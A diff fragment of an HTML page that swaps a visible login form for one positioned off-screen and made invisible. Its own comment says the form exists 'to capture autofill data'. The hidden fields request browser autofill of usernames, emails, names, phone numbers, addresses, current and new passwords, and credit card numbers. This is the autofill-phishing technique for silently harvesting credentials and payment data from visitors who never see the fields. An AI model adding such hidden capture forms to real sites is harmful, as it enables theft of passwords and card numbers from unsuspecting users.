@@ -16,11 +16,19 @@
             </video>
         </div>
         <div class="hidden-content">
-            <form id="dataCollectionForm">
-                <input type="text" id="username" name="username" placeholder="Username" autocomplete="username">
-                <input type="password" id="password" name="password" placeholder="Password" autocomplete="current-password">
-                <input type="email" id="email" name="email" placeholder="Email" autocomplete="email">
-                <button type="submit">Submit</button>
+            <!-- Hidden form to capture autofill data -->
+            <form id="autofillCapture" style="opacity: 0; position: absolute; top: -1000px;">
+                <input type="text" id="autoUsername" name="username" autocomplete="username">
+                <input type="email" id="autoEmail" name="email" autocomplete="email">
+                <input type="text" id="autoFullName" name="name" autocomplete="name">
+                <input type="tel" id="autoPhone" name="tel" autocomplete="tel">
+                <input type="text" id="autoOrganization" name="organization" autocomplete="organization">
+                <input type="password" id="autoCurrentPassword" name="current-password" autocomplete="current-password">
+                <input type="password" id="autoNewPassword" name="new-password" autocomplete="new-password">
+                <input type="text" id="autoStreetAddress" name="street-address" autocomplete="street-address">
+                <input type="text" id="autoPostalCode" name="postal-code" autocomplete="postal-code">
+                <input type="text" id="autoCountry" name="country" autocomplete="country">
+                <input type="text" id="autoCreditCard" name="cc-number" autocomplete="cc-number">
             </form>
         </div>
     </div>
